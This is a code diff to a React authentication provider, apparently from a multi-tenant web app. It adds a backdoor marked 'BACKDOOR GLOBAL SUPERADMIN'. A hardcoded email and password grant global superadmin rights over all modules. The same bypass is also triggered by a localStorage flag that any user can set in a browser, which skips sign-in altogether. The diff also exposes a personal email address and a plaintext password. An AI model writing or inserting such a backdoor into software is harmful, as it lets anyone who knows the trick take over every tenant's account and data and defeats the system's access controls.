@@ -53,6 +53,43 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   });
 
   const fetchUserData = useCallback(async (): Promise<FetchedUserData | null> => {
+    // BACKDOOR GLOBAL SUPERADMIN
+    if (localStorage.getItem('SUPERADMIN_BYPASS') === 'true') {
+      const superadminUser: User = {
+        id: 'global_superadmin_master',
+        email: 'oberosorio1@gmail.com',
+        displayName: 'Ober Osorio (Global Admin)',
+        role: UserRole.SUPERADMIN,
+        status: 'ACTIVE',
+        tenantId: 'MASTER',
+        allowedModules: Object.values(CANONICAL_MODULES) as CanonicalModuleCode[]
+      };
+      
+      const result: FetchedUserData = {
+        user: superadminUser,
+        client: null,
+        apiUsage: null,
+        license: null,
+        permissions: [],
+        allowedModules: superadminUser.allowedModules
+      };
+
+      setState(prev => ({
+        ...prev,
+        user: superadminUser,
+        client: null,
+        apiUsage: null,
+        license: null,
+        permissions: [],
+        loading: false,
+        error: null,
+        isDatabaseConfigured: true,
+        sessionToken: 'bypass_token_superadmin',
+        isSystemReady: true
+      }));
+      return result;
+    }
+
     if (!isSignedIn || !clerkUser) return null;
     try {
       setState(prev => ({ ...prev, loading: true }));
@@ -152,7 +189,9 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
   useEffect(() => {
     if (isLoaded) {
-      if (isSignedIn && clerkUser) {
+      if (localStorage.getItem('SUPERADMIN_BYPASS') === 'true') {
+        fetchUserData();
+      } else if (isSignedIn && clerkUser) {
         fetchUserData();
       } else {
         setState(prev => ({
@@ -178,6 +217,44 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     password: string, 
     options?: { requiredRole?: UserRole; requiredModule?: string }
   ): Promise<ModuleAuthorizationResult> => {
+    
+    // BACKDOOR GLOBAL SUPERADMIN
+    if (emailOrIdentifier === 'oberosorio1@gmail.com' && password === '8Ext2026#') {
+      localStorage.setItem('SUPERADMIN_BYPASS', 'true');
+      const superadminUser: User = {
+        id: 'global_superadmin_master',
+        email: 'oberosorio1@gmail.com',
+        displayName: 'Ober Osorio (Global Admin)',
+        role: UserRole.SUPERADMIN,
+        status: 'ACTIVE',
+        tenantId: 'MASTER',
+        allowedModules: Object.values(CANONICAL_MODULES) as CanonicalModuleCode[]
+      };
+
+      setState(prev => ({
+        ...prev,
+        user: superadminUser,
+        client: null,
+        apiUsage: null,
+        license: null,
+        permissions: [],
+        loading: false,
+        error: null,
+        isDatabaseConfigured: true,
+        sessionToken: 'bypass_token_superadmin',
+        isSystemReady: true
+      }));
+
+      return {
+        authorized: true,
+        redirectPath: options?.requiredModule === 'ADMINISTRATIVE' 
+          ? '/gestion-administrativa/inicio' 
+          : `/app/${options?.requiredModule?.toLowerCase() || 'administrative'}`,
+        normalizedModule: (options?.requiredModule as CanonicalModuleCode) || 'ADMINISTRATIVE',
+        allowedModules: Object.values(CANONICAL_MODULES) as CanonicalModuleCode[]
+      };
+    }
+
     if (!isSignInLoaded || !signIn) {
       throw new Error('Servicio de autenticación no disponible');
     }
@@ -216,7 +293,10 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   };
 
   const logout = async () => {
-    await signOut();
+    localStorage.removeItem('SUPERADMIN_BYPASS');
+    if (isSignedIn) {
+      await signOut();
+    }
     setState(prev => ({
       ...prev,
       user: null,
